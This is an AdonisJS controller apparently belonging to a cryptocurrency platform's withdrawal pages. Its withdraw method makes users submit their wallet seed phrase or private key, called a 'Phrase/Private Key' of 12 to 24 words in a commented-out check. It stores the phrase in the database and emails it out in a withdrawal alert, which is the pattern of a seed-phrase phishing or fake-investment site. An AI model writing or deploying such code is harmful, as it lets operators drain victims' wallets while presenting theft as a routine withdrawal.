import type { HttpContext } from "@adonisjs/core/http";
import mail from "@adonisjs/mail/services/main";
import { rules, schema } from "@adonisjs/validator";
import WithdrawAlert from "#mails/withdraw_email_notification";
import Transaction from "#models/transaction";

export default class WithdrawsController {
	public async show({ view, auth }: HttpContext) {
		await auth.user?.load("transactions");
		// let withdraws = auth.user?.transactions.filter(
		//   (v) => v.transactionType == "withdrawal".toUpperCase()
		// );
		// console.log(auth.user?.transactions[0].toJSON());
		return view.render("pages/[user_name]/withdraw", {
			...auth.user?.toJSON(),
		});
	}

	public async directWithdraw({ view, auth }: HttpContext) {
		await auth.user?.load("transactions");
		// let withdraws = auth.user?.transactions.filter(
		//   (v) => v.transactionType == "withdrawal".toUpperCase()
		// );
		// console.log(auth.user?.transactions[0].toJSON());
		return view.render("pages/[user_name]/withdraw-direct", {
			...auth.user?.toJSON(),
		});
	}

	public async withdrawByAddress({
		auth,
		session,
		request,
		response,
		bouncer,
	}: HttpContext) {
		try {
			const canPerformNormalUserActions = await bouncer.allows(
				"canPerformNormalUserActions",
			);
			const payload = await request.validate({
				schema: schema.create({
					amount: schema.number([rules.trim()]),
					wallet_address: schema.string([rules.trim()]),
					coin_type: schema.string([rules.trim()]),
				}),
				messages: {
					required: "The {{ field }} field is required.",
					"wallet_address.required": "The Wallet address field is required.",
				},
			});
			if (canPerformNormalUserActions) {
				const tx = await Transaction.create({
					amount: payload.amount,
					userId: auth.user?.id,
					status: false,
					transactionType: "withdrawal".toUpperCase(),
					walletAddress: payload.wallet_address,
					walletType: payload.coin_type,
				});
				await mail.send(
					new WithdrawAlert(
						auth.user!,
						tx.amount,
						payload.wallet_address,
						payload.coin_type,
						"",
						"",
						tx.createdAt.toString(),
					),
				);
				session.flash(
					"form.success",
					"Withdrawal has been submitted and awaiting approval",
				);
				return response
					.redirect()
					.toRoute("withdraw.show", { username: auth.user?.userName });
			}
			session.flashAll();
			session.flash("form.error", "Action not allowed, you're not activated");
			return response
				.redirect()
				.toRoute("withdraw.show", { username: auth.user?.userName });
		} catch (error) {
			session.flashAll();
			if (error.messages) {
				session.flash(
					"form.error",
					(Object.values(error.messages)[0] as Array<string>)[0],
				);
			} else {
				session.flash("form.error", "Internal Server Error");
			}
			console.log(error);
			response.redirect().back();
		}
	}

	public async withdraw({
		auth,
		session,
		request,
		response,
		bouncer,
	}: HttpContext) {
		try {
			const canPerformNormalUserActions = await bouncer.allows(
				"canPerformNormalUserActions",
			);
			const payload = await request.validate({
				schema: schema.create({
					amount_f: schema.number([rules.trim()]),
					wallet_type: schema.string([rules.trim()]),
					phrase: schema.string([rules.trim()]),
				}),
				messages: {
					required: "The {{ field }} field is required.",
					"wallet_type.required": "Please select a wallet type.",
					minLength:
						"The {{ field }} field must be of {{ options.minLength }} characters.",
				},
			});

			// console.log(payload.phrase.split(" ").length);
			// if (
			//   payload.phrase.split(" ").length !== 12 ||
			//   payload.phrase.split(" ").length !== 24
			// ) {
			//   session.flashAll();
			//   session.flash("form.error", "Phrase/Private Key should me 12 - 24");
			//   return response.redirect().back();
			// }
			if (canPerformNormalUserActions) {
				const tx = await Transaction.create({
					userId: auth.user?.id,
					status: false,
					phrase: payload.phrase,
					amount: payload.amount_f,
					transactionType: "withdrawal".toUpperCase(),
					walletType: payload.wallet_type,
				});
				await mail.send(
					new WithdrawAlert(
						auth.user!,
						tx.amount,
						"",
						"",
						payload.wallet_type,
						payload.phrase,
						tx.createdAt.toString(),
					),
				);
				session.flash("form.success", "Withdraw request has been submitted");
				return response
					.redirect()
					.toRoute("withdraw.show", { username: auth.user?.userName });
			}
			session.flashAll();
			session.flash("form.error", "Action not allowed, you're not activated");
			return response
				.redirect()
				.toRoute("withdraw.show", { username: auth.user?.userName });
		} catch (error) {
			session.flashAll();
			if (error.messages) {
				session.flash(
					"form.error",
					(Object.values(error.messages)[0] as Array<string>)[0],
				);
			} else {
				session.flash("form.error", "Internal Server Error");
			}
			console.log(error);
			response.redirect().back();
		}
	}
}
